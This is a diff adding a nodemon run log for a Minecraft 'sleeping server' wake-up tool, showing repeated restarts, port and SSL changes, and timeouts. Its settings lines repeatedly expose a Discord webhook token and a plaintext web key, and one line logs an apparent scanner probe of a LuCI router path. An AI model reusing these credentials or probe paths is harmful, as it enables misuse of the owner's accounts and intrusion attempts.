@@ -1,0 +1,1802 @@
+[33m[nodemon] 3.1.4[39m
+[33m[nodemon] reading config ./nodemon.json[39m
+[33m[nodemon] to restart at any time, enter `rs`[39m
+[33m[nodemon] or send SIGHUP to 4432 to restart[39m
+[33m[nodemon] watching path(s): src/**/*[39m
+[33m[nodemon] watching extensions: ts,json,hbs[39m
+[32m[nodemon] starting `node ./build/sleepingServerStarter.js ./`[39m
+[33m[nodemon] forking[39m
+[33m[nodemon] child pid: 4445[39m
+[33m[nodemon] watching 11 files[39m
+2024-09-09 05:25:24 info: ......................... 
+2024-09-09 05:25:24 info: ... A new story begin ... 
+2024-09-09 05:25:24 info: ......................... 
+2024-09-09 05:25:27 info: Retrieved settings:{"serverName":"버튼은 한번만 누르세요","serverPort":25565,"maxPlayers":20,"loginMessage":"...Waking server up, come back in a minute...","serverOnlineMode":true,"startMinecraft":true,"minecraftCommand":"/opt/bitnami/projects/CloudMCServerManager/start.sh","restartDelay":5000,"version":false,"useWhitelistFile":false,"useBlacklistFiles":false,"useNativeFiles":false,"webPort":3000,"webAllowRestart":true,"stopCommand":"/opt/bitnami/projects/CloudMCServerManager/stop.sh","discordWebhookUrl":"https://discord.com/api/webhooks/1124017685651542096/ehkqSKAq4CTWyH0VoUdijFOzZiTharlB-92T-Bpwg-Msm822dC0cI__O-JL30ja3oUNb","webKey":"seniorious28"} 
+2024-09-09 05:25:27 info: [WebServer] Getting server status 
+2024-09-09 05:25:27 info: [WebServer] Starting web server on *: 3000 
+2024-09-09 05:25:27 error: [WebServer] Error getting hostname 
+[33m[nodemon] 3.1.4[39m
+[33m[nodemon] reading config ./nodemon.json[39m
+[33m[nodemon] to restart at any time, enter `rs`[39m
+[33m[nodemon] or send SIGHUP to 4483 to restart[39m
+[33m[nodemon] watching path(s): src/**/*[39m
+[33m[nodemon] watching extensions: ts,json,hbs[39m
+[32m[nodemon] starting `node ./build/sleepingServerStarter.js ./`[39m
+[33m[nodemon] forking[39m
+[33m[nodemon] child pid: 4496[39m
+[33m[nodemon] watching 11 files[39m
+2024-09-09 05:28:24 info: ......................... 
+2024-09-09 05:28:24 info: ... A new story begin ... 
+2024-09-09 05:28:24 info: ......................... 
+2024-09-09 05:28:26 info: Retrieved settings:{"serverName":"버튼은 한번만 누르세요","serverPort":25565,"maxPlayers":20,"loginMessage":"...Waking server up, come back in a minute...","serverOnlineMode":true,"startMinecraft":true,"minecraftCommand":"/opt/bitnami/projects/CloudMCServerManager/start.sh","restartDelay":5000,"version":false,"useWhitelistFile":false,"useBlacklistFiles":false,"useNativeFiles":false,"webPort":80,"webAllowRestart":true,"stopCommand":"/opt/bitnami/projects/CloudMCServerManager/stop.sh","discordWebhookUrl":"https://discord.com/api/webhooks/1124017685651542096/ehkqSKAq4CTWyH0VoUdijFOzZiTharlB-92T-Bpwg-Msm822dC0cI__O-JL30ja3oUNb","webKey":"seniorious28"} 
+2024-09-09 05:28:26 info: [WebServer] Getting server status 
+2024-09-09 05:28:26 info: [WebServer] Starting web server on *: 80 
+2024-09-09 05:28:26 error: [WebServer] Error getting hostname 
+2024-09-09 05:30:26 error: ETIMEDOUT 
+2024-09-09 05:30:26 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 05:30:26 info: status and waking 
+2024-09-09 05:30:26 info: -1 
+2024-09-09 05:30:26 info: false 
+[33m[nodemon] 3.1.4[39m
+[33m[nodemon] reading config ./nodemon.json[39m
+[33m[nodemon] to restart at any time, enter `rs`[39m
+[33m[nodemon] or send SIGHUP to 6321 to restart[39m
+[33m[nodemon] watching path(s): src/**/*[39m
+[33m[nodemon] watching extensions: ts,json,hbs[39m
+[32m[nodemon] starting `node ./build/sleepingServerStarter.js ./`[39m
+[33m[nodemon] forking[39m
+[33m[nodemon] child pid: 6342[39m
+[33m[nodemon] watching 11 files[39m
+2024-09-09 06:23:26 info: ......................... 
+2024-09-09 06:23:26 info: ... A new story begin ... 
+2024-09-09 06:23:26 info: ......................... 
+2024-09-09 06:23:29 info: Retrieved settings:{"serverName":"버튼은 한번만 누르세요","serverPort":25565,"maxPlayers":20,"loginMessage":"...Waking server up, come back in a minute...","serverOnlineMode":true,"startMinecraft":true,"minecraftCommand":"/opt/bitnami/projects/CloudMCServerManager/start.sh","restartDelay":5000,"version":false,"useWhitelistFile":false,"useBlacklistFiles":false,"useNativeFiles":false,"webPort":443,"webAllowRestart":true,"stopCommand":"/opt/bitnami/projects/CloudMCServerManager/stop.sh","discordWebhookUrl":"https://discord.com/api/webhooks/1124017685651542096/ehkqSKAq4CTWyH0VoUdijFOzZiTharlB-92T-Bpwg-Msm822dC0cI__O-JL30ja3oUNb","webKey":"seniorious28"} 
+2024-09-09 06:23:29 info: [WebServer] Getting server status 
+2024-09-09 06:23:29 info: [WebServer] Starting web server on *: 443 
+2024-09-09 06:23:29 error: [WebServer] Error getting hostname 
+2024-09-09 06:25:29 error: ETIMEDOUT 
+2024-09-09 06:25:29 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 06:25:29 info: status and waking 
+2024-09-09 06:25:29 info: -1 
+2024-09-09 06:25:29 info: false 
+[33m[nodemon] 3.1.4[39m
+[33m[nodemon] reading config ./nodemon.json[39m
+[33m[nodemon] to restart at any time, enter `rs`[39m
+[33m[nodemon] or send SIGHUP to 6593 to restart[39m
+[33m[nodemon] watching path(s): src/**/*[39m
+[33m[nodemon] watching extensions: ts,json,hbs[39m
+[32m[nodemon] starting `node ./build/sleepingServerStarter.js ./`[39m
+[33m[nodemon] forking[39m
+[33m[nodemon] child pid: 6614[39m
+[33m[nodemon] watching 11 files[39m
+2024-09-09 06:29:12 info: ......................... 
+2024-09-09 06:29:12 info: ... A new story begin ... 
+2024-09-09 06:29:12 info: ......................... 
+2024-09-09 06:29:14 info: Retrieved settings:{"serverName":"버튼은 한번만 누르세요","serverPort":25565,"maxPlayers":20,"loginMessage":"...Waking server up, come back in a minute...","serverOnlineMode":true,"startMinecraft":true,"minecraftCommand":"/opt/web/CloudMCServerManager/start.sh","restartDelay":5000,"version":false,"useWhitelistFile":false,"useBlacklistFiles":false,"useNativeFiles":false,"webPort":443,"webAllowRestart":true,"stopCommand":"/opt/web/CloudMCServerManager/stop.sh","discordWebhookUrl":"https://discord.com/api/webhooks/1124017685651542096/ehkqSKAq4CTWyH0VoUdijFOzZiTharlB-92T-Bpwg-Msm822dC0cI__O-JL30ja3oUNb","webKey":"seniorious28"} 
+2024-09-09 06:29:14 info: [WebServer] Getting server status 
+2024-09-09 06:29:14 info: [WebServer] Starting web server on *: 443 
+2024-09-09 06:29:15 error: [WebServer] Error getting hostname 
+2024-09-09 06:31:15 error: ETIMEDOUT 
+2024-09-09 06:31:15 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 06:31:15 info: status and waking 
+2024-09-09 06:31:15 info: -1 
+2024-09-09 06:31:15 info: false 
+[33m[nodemon] files triggering change check: src/sleepingWeb.ts[39m
+[33m[nodemon] matched rule: /opt/web/mcsleepingserverstarter/src/**/*[39m
+[33m[nodemon] changes after filters (before/after): 1/1[39m
+[32m[nodemon] restarting due to changes...[39m
+[33m[nodemon] src/sleepingWeb.ts[39m
+
+[32m[nodemon] starting `node ./build/sleepingServerStarter.js ./`[39m
+[33m[nodemon] forking[39m
+[33m[nodemon] child pid: 6663[39m
+2024-09-09 06:34:59 info: ......................... 
+2024-09-09 06:34:59 info: ... A new story begin ... 
+2024-09-09 06:34:59 info: ......................... 
+2024-09-09 06:35:01 info: Retrieved settings:{"serverName":"버튼은 한번만 누르세요","serverPort":25565,"maxPlayers":20,"loginMessage":"...Waking server up, come back in a minute...","serverOnlineMode":true,"startMinecraft":true,"minecraftCommand":"/opt/web/CloudMCServerManager/start.sh","restartDelay":5000,"version":false,"useWhitelistFile":false,"useBlacklistFiles":false,"useNativeFiles":false,"webPort":443,"webAllowRestart":true,"stopCommand":"/opt/web/CloudMCServerManager/stop.sh","discordWebhookUrl":"https://discord.com/api/webhooks/1124017685651542096/ehkqSKAq4CTWyH0VoUdijFOzZiTharlB-92T-Bpwg-Msm822dC0cI__O-JL30ja3oUNb","webKey":"seniorious28"} 
+2024-09-09 06:35:01 info: [WebServer] Getting server status 
+2024-09-09 06:35:01 info: [WebServer] Starting web server on *: 443 
+2024-09-09 06:35:01 error: [WebServer] Error getting hostname 
+[33m[nodemon] 3.1.4[39m
+[33m[nodemon] reading config ./nodemon.json[39m
+[33m[nodemon] to restart at any time, enter `rs`[39m
+[33m[nodemon] or send SIGHUP to 6816 to restart[39m
+[33m[nodemon] watching path(s): src/**/*[39m
+[33m[nodemon] watching extensions: ts,json,hbs[39m
+[32m[nodemon] starting `node ./build/sleepingServerStarter.js ./`[39m
+[33m[nodemon] forking[39m
+[33m[nodemon] child pid: 6837[39m
+[33m[nodemon] watching 11 files[39m
+2024-09-09 06:35:39 info: ......................... 
+2024-09-09 06:35:39 info: ... A new story begin ... 
+2024-09-09 06:35:39 info: ......................... 
+2024-09-09 06:35:41 info: Retrieved settings:{"serverName":"버튼은 한번만 누르세요","serverPort":25565,"maxPlayers":20,"loginMessage":"...Waking server up, come back in a minute...","serverOnlineMode":true,"startMinecraft":true,"minecraftCommand":"/opt/web/CloudMCServerManager/start.sh","restartDelay":5000,"version":false,"useWhitelistFile":false,"useBlacklistFiles":false,"useNativeFiles":false,"webPort":443,"webAllowRestart":true,"stopCommand":"/opt/web/CloudMCServerManager/stop.sh","discordWebhookUrl":"https://discord.com/api/webhooks/1124017685651542096/ehkqSKAq4CTWyH0VoUdijFOzZiTharlB-92T-Bpwg-Msm822dC0cI__O-JL30ja3oUNb","webKey":"seniorious28"} 
+2024-09-09 06:35:41 info: [WebServer] Getting server status 
+2024-09-09 06:35:41 info: [WebServer] Starting web server on *: 443 
+2024-09-09 06:35:42 error: [WebServer] Error getting hostname 
+2024-09-09 06:37:42 error: ETIMEDOUT 
+2024-09-09 06:37:42 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 06:37:42 info: status and waking 
+2024-09-09 06:37:42 info: -1 
+2024-09-09 06:37:42 info: false 
+[33m[nodemon] files triggering change check: src/sleepingWeb.ts[39m
+[33m[nodemon] matched rule: /opt/web/mcsleepingserverstarter/src/**/*[39m
+[33m[nodemon] changes after filters (before/after): 1/1[39m
+[32m[nodemon] restarting due to changes...[39m
+[33m[nodemon] src/sleepingWeb.ts[39m
+
+[32m[nodemon] starting `node ./build/sleepingServerStarter.js ./`[39m
+[33m[nodemon] forking[39m
+[33m[nodemon] child pid: 6896[39m
+2024-09-09 06:41:08 info: ......................... 
+2024-09-09 06:41:08 info: ... A new story begin ... 
+2024-09-09 06:41:08 info: ......................... 
+2024-09-09 06:41:10 info: Retrieved settings:{"serverName":"버튼은 한번만 누르세요","serverPort":25565,"maxPlayers":20,"loginMessage":"...Waking server up, come back in a minute...","serverOnlineMode":true,"startMinecraft":true,"minecraftCommand":"/opt/web/CloudMCServerManager/start.sh","restartDelay":5000,"version":false,"useWhitelistFile":false,"useBlacklistFiles":false,"useNativeFiles":false,"webPort":443,"webAllowRestart":true,"stopCommand":"/opt/web/CloudMCServerManager/stop.sh","discordWebhookUrl":"https://discord.com/api/webhooks/1124017685651542096/ehkqSKAq4CTWyH0VoUdijFOzZiTharlB-92T-Bpwg-Msm822dC0cI__O-JL30ja3oUNb","webKey":"seniorious28"} 
+2024-09-09 06:41:10 info: [WebServer] Getting server status 
+2024-09-09 06:41:10 info: [WebServer] Starting web server on *: 443 
+2024-09-09 06:41:10 error: [WebServer] Error getting hostname 
+[33m[nodemon] 3.1.4[39m
+[33m[nodemon] reading config ./nodemon.json[39m
+[33m[nodemon] to restart at any time, enter `rs`[39m
+[33m[nodemon] or send SIGHUP to 7035 to restart[39m
+[33m[nodemon] watching path(s): src/**/*[39m
+[33m[nodemon] watching extensions: ts,json,hbs[39m
+[32m[nodemon] starting `node ./build/sleepingServerStarter.js ./`[39m
+[33m[nodemon] forking[39m
+[33m[nodemon] child pid: 7056[39m
+[33m[nodemon] watching 11 files[39m
+2024-09-09 06:41:48 info: ......................... 
+2024-09-09 06:41:48 info: ... A new story begin ... 
+2024-09-09 06:41:48 info: ......................... 
+2024-09-09 06:41:50 info: Retrieved settings:{"serverName":"버튼은 한번만 누르세요","serverPort":25565,"maxPlayers":20,"loginMessage":"...Waking server up, come back in a minute...","serverOnlineMode":true,"startMinecraft":true,"minecraftCommand":"/opt/web/CloudMCServerManager/start.sh","restartDelay":5000,"version":false,"useWhitelistFile":false,"useBlacklistFiles":false,"useNativeFiles":false,"webPort":443,"webAllowRestart":true,"stopCommand":"/opt/web/CloudMCServerManager/stop.sh","discordWebhookUrl":"https://discord.com/api/webhooks/1124017685651542096/ehkqSKAq4CTWyH0VoUdijFOzZiTharlB-92T-Bpwg-Msm822dC0cI__O-JL30ja3oUNb","webKey":"seniorious28"} 
+2024-09-09 06:41:50 info: [WebServer] Getting server status 
+2024-09-09 06:41:50 info: [WebServer] Starting web server on *: 443 
+2024-09-09 06:41:50 error: [WebServer] Error getting hostname 
+2024-09-09 06:43:51 error: ETIMEDOUT 
+2024-09-09 06:43:51 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 06:43:51 info: status and waking 
+2024-09-09 06:43:51 info: -1 
+2024-09-09 06:43:51 info: false 
+2024-09-09 06:44:19 info: to ==> https://146.56.112.234:80/ 
+[33m[nodemon] files triggering change check: src/sleepingWeb.ts[39m
+[33m[nodemon] matched rule: /opt/web/mcsleepingserverstarter/src/**/*[39m
+[33m[nodemon] changes after filters (before/after): 1/1[39m
+[32m[nodemon] restarting due to changes...[39m
+[33m[nodemon] src/sleepingWeb.ts[39m
+
+[32m[nodemon] starting `node ./build/sleepingServerStarter.js ./`[39m
+[33m[nodemon] forking[39m
+[33m[nodemon] child pid: 7237[39m
+2024-09-09 06:45:42 info: ......................... 
+2024-09-09 06:45:42 info: ... A new story begin ... 
+2024-09-09 06:45:42 info: ......................... 
+2024-09-09 06:45:44 info: Retrieved settings:{"serverName":"버튼은 한번만 누르세요","serverPort":25565,"maxPlayers":20,"loginMessage":"...Waking server up, come back in a minute...","serverOnlineMode":true,"startMinecraft":true,"minecraftCommand":"/opt/web/CloudMCServerManager/start.sh","restartDelay":5000,"version":false,"useWhitelistFile":false,"useBlacklistFiles":false,"useNativeFiles":false,"webPort":443,"webAllowRestart":true,"stopCommand":"/opt/web/CloudMCServerManager/stop.sh","discordWebhookUrl":"https://discord.com/api/webhooks/1124017685651542096/ehkqSKAq4CTWyH0VoUdijFOzZiTharlB-92T-Bpwg-Msm822dC0cI__O-JL30ja3oUNb","webKey":"seniorious28"} 
+2024-09-09 06:45:44 info: [WebServer] Getting server status 
+2024-09-09 06:45:44 info: [WebServer] Starting web server on *: 443 
+2024-09-09 06:45:44 error: [WebServer] Error getting hostname 
+[33m[nodemon] 3.1.4[39m
+[33m[nodemon] reading config ./nodemon.json[39m
+[33m[nodemon] to restart at any time, enter `rs`[39m
+[33m[nodemon] or send SIGHUP to 7393 to restart[39m
+[33m[nodemon] watching path(s): src/**/*[39m
+[33m[nodemon] watching extensions: ts,json,hbs[39m
+[32m[nodemon] starting `node ./build/sleepingServerStarter.js ./`[39m
+[33m[nodemon] forking[39m
+[33m[nodemon] child pid: 7414[39m
+[33m[nodemon] watching 11 files[39m
+2024-09-09 06:46:25 info: ......................... 
+2024-09-09 06:46:25 info: ... A new story begin ... 
+2024-09-09 06:46:25 info: ......................... 
+2024-09-09 06:46:27 info: Retrieved settings:{"serverName":"버튼은 한번만 누르세요","serverPort":25565,"maxPlayers":20,"loginMessage":"...Waking server up, come back in a minute...","serverOnlineMode":true,"startMinecraft":true,"minecraftCommand":"/opt/web/CloudMCServerManager/start.sh","restartDelay":5000,"version":false,"useWhitelistFile":false,"useBlacklistFiles":false,"useNativeFiles":false,"webPort":443,"webAllowRestart":true,"stopCommand":"/opt/web/CloudMCServerManager/stop.sh","discordWebhookUrl":"https://discord.com/api/webhooks/1124017685651542096/ehkqSKAq4CTWyH0VoUdijFOzZiTharlB-92T-Bpwg-Msm822dC0cI__O-JL30ja3oUNb","webKey":"seniorious28"} 
+2024-09-09 06:46:27 info: [WebServer] Getting server status 
+2024-09-09 06:46:27 info: [WebServer] Starting web server on *: 443 
+2024-09-09 06:46:28 error: [WebServer] Error getting hostname 
+2024-09-09 06:48:28 error: ETIMEDOUT 
+2024-09-09 06:48:28 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 06:48:28 info: status and waking 
+2024-09-09 06:48:28 info: -1 
+2024-09-09 06:48:28 info: false 
+[33m[nodemon] files triggering change check: src/sleepingWeb.ts[39m
+[33m[nodemon] matched rule: /opt/web/mcsleepingserverstarter/src/**/*[39m
+[33m[nodemon] changes after filters (before/after): 1/1[39m
+[32m[nodemon] restarting due to changes...[39m
+[33m[nodemon] src/sleepingWeb.ts[39m
+
+[32m[nodemon] starting `node ./build/sleepingServerStarter.js ./`[39m
+[33m[nodemon] forking[39m
+[33m[nodemon] child pid: 7541[39m
+2024-09-09 06:53:45 info: ......................... 
+2024-09-09 06:53:45 info: ... A new story begin ... 
+2024-09-09 06:53:45 info: ......................... 
+2024-09-09 06:53:47 info: Retrieved settings:{"serverName":"버튼은 한번만 누르세요","serverPort":25565,"maxPlayers":20,"loginMessage":"...Waking server up, come back in a minute...","serverOnlineMode":true,"startMinecraft":true,"minecraftCommand":"/opt/web/CloudMCServerManager/start.sh","restartDelay":5000,"version":false,"useWhitelistFile":false,"useBlacklistFiles":false,"useNativeFiles":false,"webPort":443,"webAllowRestart":true,"stopCommand":"/opt/web/CloudMCServerManager/stop.sh","discordWebhookUrl":"https://discord.com/api/webhooks/1124017685651542096/ehkqSKAq4CTWyH0VoUdijFOzZiTharlB-92T-Bpwg-Msm822dC0cI__O-JL30ja3oUNb","webKey":"seniorious28"} 
+2024-09-09 06:53:47 info: [WebServer] Getting server status 
+2024-09-09 06:53:47 info: [WebServer] Starting web server on *: 443 
+2024-09-09 06:53:47 error: [WebServer] Error getting hostname 
+[33m[nodemon] 3.1.4[39m
+[33m[nodemon] reading config ./nodemon.json[39m
+[33m[nodemon] to restart at any time, enter `rs`[39m
+[33m[nodemon] or send SIGHUP to 7706 to restart[39m
+[33m[nodemon] watching path(s): src/**/*[39m
+[33m[nodemon] watching extensions: ts,json,hbs[39m
+[32m[nodemon] starting `node ./build/sleepingServerStarter.js ./`[39m
+[33m[nodemon] forking[39m
+[33m[nodemon] child pid: 7727[39m
+[33m[nodemon] watching 11 files[39m
+2024-09-09 06:54:31 info: ......................... 
+2024-09-09 06:54:31 info: ... A new story begin ... 
+2024-09-09 06:54:31 info: ......................... 
+2024-09-09 06:54:33 info: Retrieved settings:{"serverName":"버튼은 한번만 누르세요","serverPort":25565,"maxPlayers":20,"loginMessage":"...Waking server up, come back in a minute...","serverOnlineMode":true,"startMinecraft":true,"minecraftCommand":"/opt/web/CloudMCServerManager/start.sh","restartDelay":5000,"version":false,"useWhitelistFile":false,"useBlacklistFiles":false,"useNativeFiles":false,"webPort":443,"webAllowRestart":true,"stopCommand":"/opt/web/CloudMCServerManager/stop.sh","discordWebhookUrl":"https://discord.com/api/webhooks/1124017685651542096/ehkqSKAq4CTWyH0VoUdijFOzZiTharlB-92T-Bpwg-Msm822dC0cI__O-JL30ja3oUNb","webKey":"seniorious28"} 
+2024-09-09 06:54:33 info: [WebServer] Getting server status 
+2024-09-09 06:54:33 info: [WebServer] Starting web server on *: 443 
+2024-09-09 06:54:33 error: [WebServer] Error getting hostname 
+2024-09-09 06:56:33 error: ETIMEDOUT 
+2024-09-09 06:56:33 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 06:56:33 info: status and waking 
+2024-09-09 06:56:33 info: -1 
+2024-09-09 06:56:33 info: false 
+2024-09-09 06:59:53 info: to ==> https://146.56.112.234/ 
+[33m[nodemon] files triggering change check: src/sleepingWeb.ts[39m
+[33m[nodemon] matched rule: /opt/web/mcsleepingserverstarter/src/**/*[39m
+[33m[nodemon] changes after filters (before/after): 1/1[39m
+[32m[nodemon] restarting due to changes...[39m
+[33m[nodemon] src/sleepingWeb.ts[39m
+
+[32m[nodemon] starting `node ./build/sleepingServerStarter.js ./`[39m
+[33m[nodemon] forking[39m
+[33m[nodemon] child pid: 7849[39m
+2024-09-09 07:01:48 info: ......................... 
+2024-09-09 07:01:48 info: ... A new story begin ... 
+2024-09-09 07:01:48 info: ......................... 
+2024-09-09 07:01:50 info: Retrieved settings:{"serverName":"버튼은 한번만 누르세요","serverPort":25565,"maxPlayers":20,"loginMessage":"...Waking server up, come back in a minute...","serverOnlineMode":true,"startMinecraft":true,"minecraftCommand":"/opt/web/CloudMCServerManager/start.sh","restartDelay":5000,"version":false,"useWhitelistFile":false,"useBlacklistFiles":false,"useNativeFiles":false,"webPort":443,"webAllowRestart":true,"stopCommand":"/opt/web/CloudMCServerManager/stop.sh","discordWebhookUrl":"https://discord.com/api/webhooks/1124017685651542096/ehkqSKAq4CTWyH0VoUdijFOzZiTharlB-92T-Bpwg-Msm822dC0cI__O-JL30ja3oUNb","webKey":"seniorious28"} 
+2024-09-09 07:01:50 info: [WebServer] Getting server status 
+2024-09-09 07:01:50 info: [WebServer] Starting web server on *: 443 
+2024-09-09 07:01:51 error: [WebServer] Error getting hostname 
+[33m[nodemon] 3.1.4[39m
+[33m[nodemon] reading config ./nodemon.json[39m
+[33m[nodemon] to restart at any time, enter `rs`[39m
+[33m[nodemon] or send SIGHUP to 8094 to restart[39m
+[33m[nodemon] watching path(s): src/**/*[39m
+[33m[nodemon] watching extensions: ts,json,hbs[39m
+[32m[nodemon] starting `node ./build/sleepingServerStarter.js ./`[39m
+[33m[nodemon] forking[39m
+[33m[nodemon] child pid: 8115[39m
+[33m[nodemon] watching 11 files[39m
+2024-09-09 07:03:22 info: ......................... 
+2024-09-09 07:03:22 info: ... A new story begin ... 
+2024-09-09 07:03:22 info: ......................... 
+2024-09-09 07:03:24 info: Retrieved settings:{"serverName":"버튼은 한번만 누르세요","serverPort":25565,"maxPlayers":20,"loginMessage":"...Waking server up, come back in a minute...","serverOnlineMode":true,"startMinecraft":true,"minecraftCommand":"/opt/web/CloudMCServerManager/start.sh","restartDelay":5000,"version":false,"useWhitelistFile":false,"useBlacklistFiles":false,"useNativeFiles":false,"webPort":443,"webAllowRestart":true,"stopCommand":"/opt/web/CloudMCServerManager/stop.sh","discordWebhookUrl":"https://discord.com/api/webhooks/1124017685651542096/ehkqSKAq4CTWyH0VoUdijFOzZiTharlB-92T-Bpwg-Msm822dC0cI__O-JL30ja3oUNb","webKey":"seniorious28"} 
+2024-09-09 07:03:24 info: [WebServer] Getting server status 
+2024-09-09 07:03:24 info: [WebServer] Starting web server on *: 443 
+2024-09-09 07:03:24 error: [WebServer] Error getting hostname 
+[33m[nodemon] files triggering change check: src/sleepingWeb.ts[39m
+[33m[nodemon] matched rule: /opt/web/mcsleepingserverstarter/src/**/*[39m
+[33m[nodemon] changes after filters (before/after): 1/1[39m
+[32m[nodemon] restarting due to changes...[39m
+[33m[nodemon] src/sleepingWeb.ts[39m
+
+[32m[nodemon] starting `node ./build/sleepingServerStarter.js ./`[39m
+[33m[nodemon] forking[39m
+[33m[nodemon] child pid: 8159[39m
+2024-09-09 07:05:23 info: ......................... 
+2024-09-09 07:05:23 info: ... A new story begin ... 
+2024-09-09 07:05:23 info: ......................... 
+2024-09-09 07:05:25 info: Retrieved settings:{"serverName":"버튼은 한번만 누르세요","serverPort":25565,"maxPlayers":20,"loginMessage":"...Waking server up, come back in a minute...","serverOnlineMode":true,"startMinecraft":true,"minecraftCommand":"/opt/web/CloudMCServerManager/start.sh","restartDelay":5000,"version":false,"useWhitelistFile":false,"useBlacklistFiles":false,"useNativeFiles":false,"webPort":443,"webAllowRestart":true,"stopCommand":"/opt/web/CloudMCServerManager/stop.sh","discordWebhookUrl":"https://discord.com/api/webhooks/1124017685651542096/ehkqSKAq4CTWyH0VoUdijFOzZiTharlB-92T-Bpwg-Msm822dC0cI__O-JL30ja3oUNb","webKey":"seniorious28"} 
+2024-09-09 07:05:25 info: [WebServer] Getting server status 
+2024-09-09 07:05:25 info: [WebServer] Starting web server on *: 443 
+2024-09-09 07:05:25 error: [WebServer] Error getting hostname 
+[33m[nodemon] 3.1.4[39m
+[33m[nodemon] reading config ./nodemon.json[39m
+[33m[nodemon] to restart at any time, enter `rs`[39m
+[33m[nodemon] or send SIGHUP to 8332 to restart[39m
+[33m[nodemon] watching path(s): src/**/*[39m
+[33m[nodemon] watching extensions: ts,json,hbs[39m
+[32m[nodemon] starting `node ./build/sleepingServerStarter.js ./`[39m
+[33m[nodemon] forking[39m
+[33m[nodemon] child pid: 8353[39m
+[33m[nodemon] watching 11 files[39m
+2024-09-09 07:06:03 info: ......................... 
+2024-09-09 07:06:03 info: ... A new story begin ... 
+2024-09-09 07:06:03 info: ......................... 
+2024-09-09 07:06:05 info: Retrieved settings:{"serverName":"버튼은 한번만 누르세요","serverPort":25565,"maxPlayers":20,"loginMessage":"...Waking server up, come back in a minute...","serverOnlineMode":true,"startMinecraft":true,"minecraftCommand":"/opt/web/CloudMCServerManager/start.sh","restartDelay":5000,"version":false,"useWhitelistFile":false,"useBlacklistFiles":false,"useNativeFiles":false,"webPort":443,"webAllowRestart":true,"stopCommand":"/opt/web/CloudMCServerManager/stop.sh","discordWebhookUrl":"https://discord.com/api/webhooks/1124017685651542096/ehkqSKAq4CTWyH0VoUdijFOzZiTharlB-92T-Bpwg-Msm822dC0cI__O-JL30ja3oUNb","webKey":"seniorious28"} 
+2024-09-09 07:06:05 info: [WebServer] Getting server status 
+2024-09-09 07:06:05 info: SSL Options: [object Object] 
+2024-09-09 07:06:05 info: [WebServer] Starting web server on *: 443 
+2024-09-09 07:06:05 error: [WebServer] Error getting hostname 
+2024-09-09 07:08:06 error: ETIMEDOUT 
+2024-09-09 07:08:06 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 07:08:06 info: status and waking 
+2024-09-09 07:08:06 info: -1 
+2024-09-09 07:08:06 info: false 
+[33m[nodemon] files triggering change check: src/sleepingWeb.ts[39m
+[33m[nodemon] matched rule: /opt/web/mcsleepingserverstarter/src/**/*[39m
+[33m[nodemon] changes after filters (before/after): 1/1[39m
+[32m[nodemon] restarting due to changes...[39m
+[33m[nodemon] src/sleepingWeb.ts[39m
+
+[32m[nodemon] starting `node ./build/sleepingServerStarter.js ./`[39m
+[33m[nodemon] forking[39m
+[33m[nodemon] child pid: 8464[39m
+2024-09-09 07:10:38 info: ......................... 
+2024-09-09 07:10:38 info: ... A new story begin ... 
+2024-09-09 07:10:38 info: ......................... 
+2024-09-09 07:10:40 info: Retrieved settings:{"serverName":"버튼은 한번만 누르세요","serverPort":25565,"maxPlayers":20,"loginMessage":"...Waking server up, come back in a minute...","serverOnlineMode":true,"startMinecraft":true,"minecraftCommand":"/opt/web/CloudMCServerManager/start.sh","restartDelay":5000,"version":false,"useWhitelistFile":false,"useBlacklistFiles":false,"useNativeFiles":false,"webPort":443,"webAllowRestart":true,"stopCommand":"/opt/web/CloudMCServerManager/stop.sh","discordWebhookUrl":"https://discord.com/api/webhooks/1124017685651542096/ehkqSKAq4CTWyH0VoUdijFOzZiTharlB-92T-Bpwg-Msm822dC0cI__O-JL30ja3oUNb","webKey":"seniorious28"} 
+2024-09-09 07:10:40 info: [WebServer] Getting server status 
+2024-09-09 07:10:40 info: SSL Options: [object Object] 
+2024-09-09 07:10:40 info: [WebServer] Starting web server on *: 443 
+2024-09-09 07:10:41 error: [WebServer] Error getting hostname 
+2024-09-09 07:10:53 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-09 07:12:41 error: ETIMEDOUT 
+2024-09-09 07:12:41 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 07:12:41 info: status and waking 
+2024-09-09 07:12:41 info: -1 
+2024-09-09 07:12:41 info: false 
+[33m[nodemon] files triggering change check: src/sleepingWeb.ts[39m
+[33m[nodemon] matched rule: /opt/web/mcsleepingserverstarter/src/**/*[39m
+[33m[nodemon] changes after filters (before/after): 1/1[39m
+[32m[nodemon] restarting due to changes...[39m
+[33m[nodemon] src/sleepingWeb.ts[39m
+
+[32m[nodemon] starting `node ./build/sleepingServerStarter.js ./`[39m
+[33m[nodemon] forking[39m
+[33m[nodemon] child pid: 8685[39m
+2024-09-09 07:14:28 info: ......................... 
+2024-09-09 07:14:28 info: ... A new story begin ... 
+2024-09-09 07:14:28 info: ......................... 
+2024-09-09 07:14:32 info: Retrieved settings:{"serverName":"버튼은 한번만 누르세요","serverPort":25565,"maxPlayers":20,"loginMessage":"...Waking server up, come back in a minute...","serverOnlineMode":true,"startMinecraft":true,"minecraftCommand":"/opt/web/CloudMCServerManager/start.sh","restartDelay":5000,"version":false,"useWhitelistFile":false,"useBlacklistFiles":false,"useNativeFiles":false,"webPort":443,"webAllowRestart":true,"stopCommand":"/opt/web/CloudMCServerManager/stop.sh","discordWebhookUrl":"https://discord.com/api/webhooks/1124017685651542096/ehkqSKAq4CTWyH0VoUdijFOzZiTharlB-92T-Bpwg-Msm822dC0cI__O-JL30ja3oUNb","webKey":"seniorious28"} 
+2024-09-09 07:14:32 info: [WebServer] Getting server status 
+2024-09-09 07:14:32 info: SSL Options: -----BEGIN CERTIFICATE-----
+MIIE5zCCA8+gAwIBAgISBEEj4yzvh0i6tsevjIA1N5HWMA0GCSqGSIb3DQEBCwUA
+MDMxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEw1MZXQncyBFbmNyeXB0MQwwCgYDVQQD
